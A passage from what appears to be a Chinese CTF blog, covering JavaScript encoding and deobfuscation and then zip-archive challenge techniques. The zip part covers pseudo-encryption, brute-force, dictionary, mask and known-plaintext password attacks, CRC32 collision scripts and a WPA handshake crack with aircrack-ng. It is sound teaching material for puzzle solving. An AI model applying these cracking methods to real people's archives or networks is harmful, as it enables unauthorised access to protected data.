<p>​            手动：    其实jjencode的最后是一个函数，为此，我们只需要最后的()改成.toString()即可</p>
<p>aaencode将JS代码转换成只有符号的字符串，aaencode可以将JS代码转换成常用的网络表情，也就是我们说的颜文字js加密。纯粹的表情</p>
<p>加密工具                <a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="external">http://utf-8.jp/public/aaencode.html</a></p>
<p>解密工具                <a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html" target="_blank" rel="external">https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html</a></p>
<p>​            手动：    其实aaencode的最后是一个函数，为此，我们只需要最后的(&#39;_&#39;)改成.toString()即可</p>
<h4 id="0x3-2-9-jother加解密"><a href="#0x3-2-9-jother加解密" class="headerlink" title="0x3.2.9 jother加解密"></a>0x3.2.9 jother加解密</h4><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括： <code>! + ( ) [ ] { }</code> 。只用这些字符就能完成对任意字符串的编码。不同于jsfuck，它多了{}这两个大括号</p>
<p>这里可以参考文章<a href="http://wps2015.org/drops/drops/jother%E7%BC%96%E7%A0%81%E4%B9%8B%E8%B0%9C.html" target="_blank" rel="external">jother编码之谜</a></p>
<p>加密工具                工具包-&gt;Misc-&gt;jother</p>
<p>解密工具                由于jother执行之后所得到的结果分为字符串和函数两种，所以解密的方法也不相同。</p>
<p>​            字符串：直接在Console界面中输入并回车即可</p>
<p>​            函数：    对于函数类型的jother加密结果，我们只需要将最后的()改成.toString()即可</p>
<h4 id="0x3-2-10-自定义加密算法"><a href="#0x3-2-10-自定义加密算法" class="headerlink" title="0x3.2.10 自定义加密算法"></a>0x3.2.10 自定义加密算法</h4><p>这无疑是这里面最难的一类。这样的一类算法，有可能是非对称的，经过加密之后仍能完成对应的功能！</p>
<p>当然有些对称的，如果作者给出解密算法，可能就比较容易。关键是作者会不会这么做了</p>
<p>ps：基于大多数情况下，js代码加密之后，对应代码不一定能执行，所以通常js文件中会有对应的解密算法！</p>
<h3 id="0x3-3-js混淆"><a href="#0x3-3-js混淆" class="headerlink" title="0x3.3 js混淆"></a>0x3.3 js混淆</h3><p>混淆应该是工业界和ctf题中用得最多的方式之一了。Javascript 作为一种运行在客户端的脚本语言，其源代码对用户来说是完全可见的。但不是每一个 js 开发者都希望自己的代码能被直接阅读，比如恶意软件的制造者们。为了增加代码分析的难度，混淆（obfuscate）工具被应用到了许多恶意软件（如 0day 挂马、跨站攻击等）当中。分析人员为了掀开恶意软件的面纱，首先就得对脚本进行反混淆（deobfuscate）处理。</p>
<p><strong>这一节的js混淆，强调的只是复杂化表达式</strong></p>
<p>代码混淆不一定会调用 eval，也可以通过在代码中填充无效的指令来增加代码复杂度，极大地降低可读性。Javascript 中存在许多称得上丧心病狂的特性，这些特性组合起来，可以把原本简单的字面量（Literal）、成员访问（MemberExpression）、函数调 用（CallExpression）等代码片段变得难以阅读。</p>
<p>Js 中的字面量有字符串、数字、正则表达式</p>
<p>下面简单举一个例子。</p>
<ul>
<li>访问一个对象的成员有两种方法——点运算符和下标运算符。调用 window 的 eval 方法，既可以写成 <code>window.eval()</code>，也可以 <code>window[&#39;eval&#39;]</code>；</li>
<li>为了让代码更变态一些，混淆器选用第二种写法，然后再在字符串字面量上做文章。先把字符串拆成几个部分：<code>&#39;e&#39; + &#39;v&#39; + &#39;al&#39;</code>；</li>
<li>这样看上去还是很明显，再利用一个数字进制转换的技巧：<code>14..toString(15) + 31..toString(32) + 0xf1.toString(22)</code>；</li>
<li>一不做二不休，把数字也展开：<code>(0b1110).toString(4&lt;&lt;2) + (&#39; &#39;.charCodeAt() - 1).toString(Math.log(0x100000000) / Math.log(2)) + 0xf1.toString(11 &lt;&lt; 1)</code>；</li>
<li>最后的效果：<code>window[(2*7).toString(4&lt;&lt;2) + (&#39; &#39;.charCodeAt() - 1).toString(Math.log(0x100000000) / Math.log(2)) + 0xf1.toString(11 &lt;&lt; 1)](&#39;alert(1)&#39;)</code></li>
</ul>
<p>在 js 中可以找到许多这样互逆的运算，通过使用随机生成的方式将其组合使用，可以把简单的表达式无限复杂化。</p>
<h4 id="0x3-3-1-解析和变换代码"><a href="#0x3-3-1-解析和变换代码" class="headerlink" title="0x3.3.1 解析和变换代码"></a>0x3.3.1 解析和变换代码</h4><p>本文对 Javascript 实现反混淆的思路是模拟执行代码中可预测结果的部分，编写一个简单的脚本执行引擎，只执行符合某些预定规则的代码块，最后将计算结果替换掉原本冗长的代码，实现表达式的简化。</p>
<p>如果对脚本引擎解释器的原理有初步了解的话，可以知道解释器在为了“读懂”代码，会对源代码进行词法分析、语法分析，将代码的字符串转换为抽象语法树（<a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree" target="_blank" rel="external">Abstract Syntax Tree</a>, AST）的数据形式。</p>
<p>如这段代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="number">42</span>; <span class="keyword">var</span> b = <span class="number">5</span>; <span class="function"><span class="keyword">function</span> <span class="title">addA</span>(<span class="params">d</span>) </span>&#123; <span class="keyword">return</span> a + d; &#125; <span class="keyword">var</span> c = addA(<span class="number">2</span>) + b;</div></pre></td></tr></table></figure>
<p>对应的语法树如图：</p>
<p><img src="/images/2017-11-12/31.png" alt=""></p>
<p>（由 <a href="http://jointjs.com/demos/javascript-ast" target="_blank" rel="external">JointJS</a>的在线工具生成）</p>
<p>不考虑 JIT 技术，解释器可以从语法树的根节点开始，使用深度优先遍历整棵树的所有节点，根据节点上分析出来的指令逐个执行，直到脚本结束返回结果。</p>
<p>通过 js 代码生成抽象语法树的工具很多，如压缩器 <a href="https://github.com/mishoo/UglifyJS" target="_blank" rel="external">UglifyJS</a> 带的 parser，还有本文使用的 <a href="http://esprima.org/" target="_blank" rel="external">esprima</a>。</p>
<p>esprima 提供的接口很简单：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ast = <span class="built_in">require</span>(<span class="string">'esprima'</span>).parse(code)</div></pre></td></tr></table></figure>
<p>另外 Esprima 提供了一个在线工具，可以把任意（合法的）Javascript 代码解析成为 AST 并输出： <a href="http://esprima.org/demo/parse.html" target="_blank" rel="external">http://esprima.org/demo/parse.html</a></p>
<p>再结合 estools 的几个辅助库即可对 js 进行静态代码分析：</p>
<ul>
<li><a href="https://github.com/estools/escope" target="_blank" rel="external">escope</a> Javascript 作用域分析工具</li>
<li><a href="https://github.com/estools/esutils" target="_blank" rel="external">esutil</a> 辅助函数库，检查语法树节点是否满足某些条件</li>
<li><a href="http://github.com/estools/estraverse" target="_blank" rel="external">estraverse</a>语法树遍历辅助库，接口有一点类似 SAX 方式解析 XML</li>
<li><a href="http://github.com/estools/esrecurse" target="_blank" rel="external">esrecurse</a> 另一个语法树遍历工具，使用递归</li>
<li><a href="https://github.com/estools/esquery" target="_blank" rel="external">esquery</a> 使用 css 选择器的语法从语法树中提取符合条件的节点</li>
<li><a href="http://github.com/estools/escodegen" target="_blank" rel="external">escodegen</a>与 esprima 功能互逆，将语法树还原为代码</li>
</ul>
<p>项目中使用的遍历工具是 estraverse。其提供了两个静态方法，<code>estraverse.traverse</code> 和 <code>estraverse.replace</code>。前者单纯遍历 AST 的节点，通过返回值控制是否继续遍历到叶子节点；而 replace 方法则可以在遍历的过程中直接修改 AST，实现代码重构功能。具体的用法可以参考其官方文档，或者本文附带的示例代码。</p>
<h4 id="0x3-3-2-规则设计"><a href="#0x3-3-2-规则设计" class="headerlink" title="0x3.3.2 规则设计"></a>0x3.3.2 规则设计</h4><p>从实际遇到的代码入手。最近在研究一些 XSS 蠕虫的时候遇到了类似如下代码混淆：</p>
<p><img src="/images/2017-11-12/41.png" alt=""></p>
<p>观察其代码风格，发现这个混淆器做了这几件事：</p>
<ul>
<li>字符串字面量混淆：首先提取全部的字符串，在全局作用域创建一个字符串数组，同时转义字符增大阅读难度，然后将字符串出现的地方替换成为数组元素的引用</li>
<li>变量名混淆：不同于压缩器的缩短命名，此处使用了下划线加数字的格式，变量之间区分度很低，相比单个字母更难以阅读</li>
<li>成员运算符混淆：将点运算符替换为字符串下标形式，然后对字符串进行混淆</li>
<li>删除多余的空白字符：减小文件体积，这是所有压缩器都会做的事</li>
</ul>
<p>经过搜索，这样的代码很有可能是通过 <a href="http://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank" rel="external">javascriptobfuscator.com</a>的免费版生成的。其中免费版可以使用的三个选项（<code>Encode Strings / Move Strings / Replace Names</code>）也印证了前面观察到的现象。</p>
<p>这些变换中，变量名混淆是不可逆的。要是可以智能给变量命名的工具也不错，比如这个 <a href="http://jsnice.org/" target="_blank" rel="external">jsnice</a> 网站提供了一个在线工具，可以分析变量具体作用自动重命名。就算不能做到十全十美，实在不行就用人工的方式，使用 IDE（如 WebStorm）的代码重构功能，结合代码行为分析进行手工重命名还原。</p>
<p>再看字符串的处理。由于字符串将会被提取到一个全局的数组，在语法树中可以观察到这样的特征： 在全局作用域下，出现一个 VariableDeclarator，其 init 属性为 ArrayExpression，而且所有元素都是 Literal ——这说明这个数组所有元素都是常量。简单地将其求值，与变量名（标识符）关联起来。注意，此处为了简化处理，并没有考虑变量名作用域链的问题。在 js 中，作用域链上存在变量名的优先级，比如全局上的变量名是可以被局部变量重新定义的。如果混淆器再变态一点，在不同的作用域上使用相同的变量名，反混淆器 又没有处理作用域的情况，将会导致解出来的代码出错。</p>
<p>在测试程序中我设置了如下的替换规则：</p>
<ul>
<li>全局变量声明的字符串数组，在代码中直接使用数字下标引用其值</li>
<li>结果确定的一连串二元运算，如 <code>1 * 2 + 3 / 4 - 6 % 5</code></li>
<li>正则表达式字面量的 source，字符串字面量的 length</li>
<li>完全由字符串常量组成的数组，其<code>join / reverse / slice</code> 等方法的返回值</li>
<li>字符串常量的 <code>substr / charAt</code> 等方法的返回值</li>
<li>decodeURIComponent 等全局函数，其所有参数为常量的，替换为其返回值</li>
<li>结果为常数的数学函数调用，如 <code>Math.sin(3.14)</code></li>
</ul>
<p>至于缩进的还原，这是 escodegen 自带的功能。在调用 <code>escodegen.generate</code>方法生成代码的时候使用默认的配置（忽略第二个参数）即可。</p>
<h4 id="0x3-3-3-DEMO-程序"><a href="#0x3-3-3-DEMO-程序" class="headerlink" title="0x3.3.3 DEMO 程序"></a>0x3.3.3 DEMO 程序</h4><p>这个反混淆器的原型放在 GitHub 上：<a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo</a></p>
<p>运行环境和使用方法参考仓库的 README。</p>
<p>从  <a href="http://youmightnotneedjquery.com/" target="_blank" rel="external">YOU MIGHT NOT NEED JQUERY</a>上摘抄了一段代码，放入 <a href="https://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank" rel="external">javascriptobfuscator.com</a> 测试混淆：</p>
<p><img src="/images/2017-11-12/52.png" alt=""></p>
<p>将混淆结果<a href="https://github.com/ChiChou/etacsufbo/blob/master/tests/cases/jsobfuscator.com.js" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo/blob/master/tests/cases/jsobfuscator.com.js</a>进行解开，结果如下：</p>
<p><img src="/images/2017-11-12/61.png" alt=""></p>
<p>虽然变量名可读性依旧很差，但已经可以大体看出代码的行为了。</p>
<p>演示程序目前存在大量局限性，只能算一个半自动的辅助工具，还有许多没有实现的功能。</p>
<p>一些混淆器会对字符串字面量进行更复杂的保护，将字符串转换为 f(x) 的形式，其中 f 函数为一个解密函数，参数 x 为密文的字符串。也有原地生成一个匿名函数，返回值为字符串的。这种方式通常使用的函数表达式具有上下文无关的特性——其返回值只与函数的输入有关，与当 前代码所处的上下文（比如类的成员、DOM 中取到的值）无关。如以下代码片段中的 xor 函数：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> xor = <span class="function"><span class="keyword">function</span>(<span class="params">str, a, b</span>) </span>&#123;</div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> <span class="built_in">String</span>.fromCharCode.apply(<span class="literal">null</span>, str.split(<span class="string">''</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params">c, i</span>) </span>&#123; <span class="keyword">var</span> ascii = c.charCodeAt(<span class="number">0</span>);</div></pre></td></tr></table></figure>
<p>如何判断某个函数是否具有这样的特性呢？首先一些库函数可以确定符合，如 <code>btoa，escape，String.fromCharCode</code> 等，只要输入值是常量，返回值就是固定的。建立一个这样的内置函数白名单，接着遍历函数表达式的 AST，若该函数参与计算的参数均没有来自外部上下文，且其所有 CallExpression 的 callee 在函数白名单内，那么通过递归的方式可以确认一个函数是否满足条件。</p>
<p>还有的混淆器会给变量创建大量的引用实例，也就是给同一个对象使用了多个别名，阅读起来非常具有干扰性。可以派出 escope 工具对变量标识符进行数据流分析，替换为所指向的正确值。还有利用数学的恒等式进行混淆的。如声明一个变量 a，若 a 为 Number，则表达式 <code>a-a</code>、<code>a * 0</code> 均恒为 0。但如果 a 满足 <code>isNaN(a)</code>，则表达式返回 <code>NaN</code>。要清理这类代码，同样需要借助数据流分析的方法。</p>
<p>目前还没有见到使用扁平化流程跳转实现的 js 混淆样本，笔者认为可能跟 js 语言本身的使用场景和特点有关。一般 js 的代都是偏业务型的，不会有太复杂的流程控制或者算法，混淆起来效果不一定理想。</p>
<h4 id="0x3-3-4-工具总结"><a href="#0x3-3-4-工具总结" class="headerlink" title="0x3.3.4 工具总结"></a>0x3.3.4 工具总结</h4><p>混淆工具：        <a href="https://javascriptobfuscator.com/Javascript-Obfuscator.aspx" target="_blank" rel="external">https://javascriptobfuscator.com/Javascript-Obfuscator.aspx</a>    ( Encode Strings / Move Strings / Replace Names )</p>
<p>​                <a href="http://tool.lu/js/" target="_blank" rel="external">http://tool.lu/js/</a>        ( Replace Names )</p>
<p>​                <a href="https://jscrambler.com" target="_blank" rel="external">https://jscrambler.com</a></p>
<p>去混淆工具：        <a href="https://github.com/ChiChou/etacsufbo" target="_blank" rel="external">https://github.com/ChiChou/etacsufbo</a>  ( 该工具去混淆能力太差 )</p>
<p>​                <a href="http://jsnice.org/" target="_blank" rel="external">http://jsnice.org/</a></p>
<p>​                <a href="http://www.bm8.com.cn/jsConfusion/" target="_blank" rel="external">http://www.bm8.com.cn/jsConfusion/</a></p>
<p>​        反混淆终极工具： <a href="https://prepack.io/" target="_blank" rel="external">https://prepack.io/</a></p>
<p>​        最终推荐： 如果代码量不是特别大的化，手动去混淆吧，少年！</p>
<p>这儿找到了一个手动去混淆的栗子，供大家观摩<a href="https://www.blackglory.me/l1l-document-all-features-detailed-js-confused-with-anti-aliasing-process/" target="_blank" rel="external">https://www.blackglory.me/l1l-document-all-features-detailed-js-confused-with-anti-aliasing-process/</a></p>
<p>​                </p>
<p>​            </p>
]]></content>
      
        <categories>
            
            <category> misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF比赛中关于zip的总结]]></title>
      <url>/2017/11/12/CTF%E6%AF%94%E8%B5%9B%E4%B8%AD%E5%85%B3%E4%BA%8Ezip%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>本文摘抄于<a href="http://www.360zhijia.com/360anquanke/217342.html" target="_blank" rel="external">http://www.360zhijia.com/360anquanke/217342.html</a></p>
<p><strong>前言</strong></p>
<p>在CTF比赛的MISC和CRYPTO中，经常要和zip压缩包打交道，这里做一个zip方面的总结。</p>
<p>本文中用到的所有文件和工具都可在这个网盘中找到<a href="http://pan.baidu.com/s/1bWQxyA" target="_blank" rel="external">http://pan.baidu.com/s/1bWQxyA</a></p>
<p><strong>0x01. 通过进制转换隐藏信息：</strong></p>
<p>这种方法比较简单，直接拿一道题讲解（题目来自ISCC 2017 Basic-04）。题目给了一个txt文档如下图</p>
<p><img src="/images/2017-11-12/3e25b7a0-4b87-4c8b-846f-0be33bf3eba5.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>经过观察，所有数据都在16进制能表示的范围之内，因此先尝试使用十六进制编码解密，python脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">with</span> open(<span class="string">'Basic-04.txt'</span>) <span class="keyword">as</span> f:</div><div class="line">    cipher = f.read()<span class="comment">#读取txt内容</span></div><div class="line">    plain = cipher.decode(<span class="string">'hex'</span>)<span class="comment">#16进制编码解密</span></div><div class="line">    <span class="keyword">print</span> plain</div></pre></td></tr></table></figure>
<p>运行结果如下，虽然存在大量乱码，但还是能看到flag.txt，因此猜测txt中的这段字符是zip包的16进制表示（同时开头的PK也暗示这是一个zip包，PK是zip格式发明者Phil Katz的名称缩写，zip的前两个字母就用了PK）</p>
<p><img src="/images/2017-11-12/b62f4eaa-3cc6-4b67-9c05-e254dbd74a00.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>导入到16进制编辑器中，这里用010editor做演示</p>
<p><img src="/images/2017-11-12/9c17b419-0b59-48a1-b885-43a689efc3d1.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>导入后选择 Save As（快捷键 ctrl + shift + s），给新文件命名时加上后缀.zip，保存后发现zip文件是正常的，因此证明思路正确，此题的后续过程请继续阅读这篇文章</p>
<p><img src="/images/2017-11-12/ee893556-4336-43f8-9c5f-fee6301bb5ea.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>另：除了16进制的编码转换，有时还会遇到2进制编码的转换，思路相同，不再复述</p>
<p><strong>0x02. 在图片中隐藏压缩包（</strong><a href="http://baike.baidu.com/item/%E5%9B%BE%E7%A7%8D" target="_blank" rel="external"><strong>图种</strong></a><strong>）</strong></p>
<p>这种方法大概是zip中最常见的，多用于在一张图片中隐藏一个压缩包，这种方法的原理是：以jpg格式的图片为例，<font color="#f00">一个完整的 JPG 文件由 FF D8 开头，FF D9结尾，图片浏览器会忽略 FF D9 以后的内容，因此可以在 JPG 文件中加入其他文件。</font></p>
<p>也以一道题为例为例（ISCC 2017 Basic-07），对于这种隐写最简单的方法是使用Kali下的binwalk进行检测，binwalk 图片名 如下，检测出图片中存在压缩包</p>
<p><img src="/images/2017-11-12/5dda6aaa-d385-4484-a016-924fa3b455b4.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>分离这个压缩包也有至少两种方法：</p>
<ol>
<li>利用Linux下的foremost工具， foremost 图片名 如下，foremost默认的输出文件夹为output，在这个文件夹中可以找到分离出的zip（推荐使用这种方法，因为foremost还能分离出其他隐藏的文件）</li>
</ol>
<p><img src="/images/2017-11-12/748af5ce-12c7-49ef-9294-9236252f62ac.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<ol start="2">
<li>更简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败）</li>
</ol>
<p><img src="/images/2017-11-12/0ff33b0f-00fd-4989-a3e1-79acd0508ba2.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>另：本题后续步骤为构造字典，爆破握手包</p>
<p><strong>0x03. 伪加密</strong></p>
<p>Zip伪加密与zip的文件格式有关（zip的格式详解请翻到本文的最后0x07部分），zip中有一位是标记文件是否加密的，如果更改一个未加密zip包的加密标记位，那么在打开压缩包时就会提示该文件是加密的。</p>
<p><strong>对于伪加密有以下几种方法：</strong></p>
<ol>
<li><p>在Mac OS及部分Linux（如Kali）系统中，可以直接打开伪加密的zip压缩包</p>
</li>
<li><p>使用检测伪加密的ZipCenOp.jar，解密后如果能成功打开zip包，则是伪加密，否则说明思路错误</p>
</li>
<li><p>使用16进制编辑器改回加密标记位</p>
</li>
</ol>
<p>以HBCTF的一道题讲解这几种方法：</p>
<p><img src="/images/2017-11-12/4402f75b-6999-42ca-a368-944c48e1066c.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>如上，尝试解压压缩包时提示有密码，根据题干：比爆破更好的方法推测为伪加密，用三种方法来解此题：</p>
<ol>
<li>用除windows外的系统直接打开压缩包</li>
</ol>
<p>在Mac OS和部分Linux系统（如Kali）中，右键解压可直接打开伪加密的zip压缩包，笔者暂未明确何种Linux能打开伪加密压缩包，如有传授，不胜感激！</p>
<ol start="2">
<li>使用ZipCenOp.jar（需java环境） 使用方法</li>
</ol>
<p>java -jar ZipCenOp.jar r xxx.zip</p>
<p><img src="/images/2017-11-12/bef05703-6e42-4317-b03d-758534ce6a29.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>经ZipCenOp.jar解密后的压缩包可直接打开</p>
<p><img src="/images/2017-11-12/082f2f7a-5090-4384-91c5-131e155f4638.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>推荐使用这种方法，最便捷</p>
<ol start="3">
<li>用16进制编辑器修改加密标记位</li>
</ol>
<p><img src="/images/2017-11-12/70c5d8a2-cc59-40ac-94c5-dace44d4d5d8.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>如上图，修改加密标记位为00，保存，即可打开压缩包（关于zip文件的结构，请翻到本文最末0x07部分）</p>
<p><strong>0x04. 爆破/字典/掩码攻击</strong></p>
<p>把这三种归位一类是因为这三种方法在本质上都是逐个尝试，只不过待选密码的集合不同</p>
<ol>
<li><p>爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码</p>
</li>
<li><p>字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上</p>
</li>
<li><p>掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少</p>
</li>
</ol>
<p>对这一类的zip问题，推荐windows下的神器AZPR</p>
<p>举例如下：</p>
<ol>
<li>对爆破，以ISCC 2017 Basic-08为例，选定暴力攻击、字符集和长度后进行爆破</li>
</ol>
<p><img src="/images/2017-11-12/d4a20959-4eb1-445d-8522-be8800af19a2.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p><img src="/images/2017-11-12/eda9d191-8c4e-40ca-9cfc-9f28f9820744.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>点击开始，进行爆破，如下图，在4ms内就找到了密码为BIT</p>
<p><img src="/images/2017-11-12/c37f0cf4-8cf9-4bb1-8092-2cab0352b7d1.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>另：此题后续为简单的base64解密；爆破在密码长度小于6位时较快，因此如果在7位之内没有爆破出结果时，基本就可以考虑换个方法了；此题的正规解法是培根密码的转换</p>
<ol start="2">
<li>字典，还以之前的ISCC 2017 Basic-07举例，从图片中分离出一个加密的zip压缩包，爆破无果后考虑字典攻击（可从网上下载字典，但大多数题目需要自己构造字典，文末的网盘连接里提供了常见的字典）</li>
</ol>
<p><img src="/images/2017-11-12/1b80a910-e093-4c57-94d1-3abe7e9cada8.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>字典攻击的结果如下图，在字典选择合适的情况下，用很短的时间就能找到密码</p>
<p><img src="/images/2017-11-12/a050cfb3-03e7-4a58-938c-91e9190835f3.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>继续以此题为例，解压后的压缩包有一个txt文档和一个握手包，txt内容如下：</p>
<p><img src="/images/2017-11-12/e4e6f09e-bed2-4e4e-acc9-37cdfd3d4bae.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>因此可知握手包的密码为ISCC****的形式（*代表大写字母或数字），自己写程序构造字典</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> string</div><div class="line">pw = <span class="string">'ISCC'</span></div><div class="line">s = string.digits + string.uppercase<span class="comment">#s为后四位密码的可选字符集</span></div><div class="line">  </div><div class="line">f = open(<span class="string">'dic.txt'</span>, <span class="string">'w'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</div><div class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> s:</div><div class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> s:</div><div class="line">                f.write(pw + i + j + p + q + <span class="string">'\n'</span>)<span class="comment">#注意字典中的每一条记录都以\n结尾</span></div><div class="line">                 </div><div class="line">f.close()</div></pre></td></tr></table></figure>
<p>运行此程序得到字典如下：</p>
<p><img src="/images/2017-11-12/8c1b66a8-ae92-44b2-9b30-b3044e5d4ea1.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>之后用aircrack-ng来选中字典跑除握手包的密码如下图，不再详述</p>
<p><img src="/images/2017-11-12/2c3138fd-35fd-4bf6-90c3-f0ed7879d235.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p><img src="/images/2017-11-12/f2dd1797-5ef2-4aae-bb8e-e42f415a0c47.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<ol start="3">
<li>掩码攻击，以ISCC 2017 Misc-06为例，题目给了一个jpg图片，用0x02中的方法分离出加密的压缩包，根据题目提示：注意署名， 构造????LiHua的掩码（?可在自己定义的字符集中任意选择）进行掩码攻击，如下图：</li>
</ol>
<p><img src="/images/2017-11-12/3cb82d40-9d28-436f-b5a7-cdc72e531c0a.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p>攻击结果如下，只耗费了很少的时间就找到了密码</p>
<p><img src="/images/2017-11-12/b4adc984-cf39-4e3b-8e19-109e5325c0b8.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
<p><strong>0x05. 明文攻击</strong></p>
<font color="#f00">明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件</font>，更详细的原理请读者自行谷歌<br><br>举个例子，已知 明文攻击.zip 中存在的文件 明文.txt，<br><br>因此将 明文.txt 压缩，这里需要判断明文压缩后的CRC32是否与加密文件中的一致，若不一致可以换一个压缩工具。<br><br><img src="/images/2017-11-12/80c253aa-6d1a-45d0-924b-e0c04d53750c.png" alt="【技术分享】CTF比赛中关于zip的总结"><br><br><br><br>攻击过程如下：<br><br><img src="/images/2017-11-12/2de96199-e5c8-41ac-932c-816aea78148a.png" alt="【技术分享】CTF比赛中关于zip的总结"><br><br>点击开始，很快就恢复了密码<br><br><img src="/images/2017-11-12/aefe58e9-d708-4ef3-b7ee-cba6ab2b777b.png" alt="【技术分享】CTF比赛中关于zip的总结"><br><br>另：当明文的大小比较小时，攻击速度会比较慢；即使有时没有恢复密码，也可以使用明文攻击，最后点保存还是能得到压缩包里内容的。<br><br><strong>0x06. CRC32碰撞</strong><br><br>CRC32:CRC本身是“<a href="http://baike.baidu.com/item/CRC32" target="_blank" rel="external">冗余校验码</a>”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。<br><br>在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容<br><br>还是以之前HBCTF伪加密那道题为例，另一种解法就是CRC32碰撞，打开压缩包，可以看出压缩文件 flag6位数<br><br>的CRC32值为0x9c4d9a5d<br><br><img src="/images/2017-11-12/36822cdc-36ae-4c31-acd0-6400ace26953.png" alt="【技术分享】CTF比赛中关于zip的总结"><br><br>因此写出碰撞的脚本如下：<br><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> binascii</div><div class="line">  </div><div class="line">crc = <span class="number">0x9c4d9a5d</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>, <span class="number">999999</span> + <span class="number">1</span>):<span class="comment">#题目提示flag为6位数，因此只选择6位数字爆破</span></div><div class="line">    <span class="keyword">if</span> (binascii.crc32(str(i)) &amp; <span class="number">0xffffffff</span>) == crc:</div><div class="line">        <span class="keyword">print</span> i</div></pre></td></tr></table></figure><br><br><font color="#f00">要特别注意<br><br>if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:<br><br>在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC 结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换。如果是 Python 3.x 的版本，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff 。</font>

<p>脚本的运行结果如下，即为压缩文件的内容：</p>
<p><img src="/images/2017-11-12/712d9efc-cdbc-4863-bcab-aa9d39ba5ae0.png" alt="【技术分享】CTF比赛中关于zip的总结"></p>
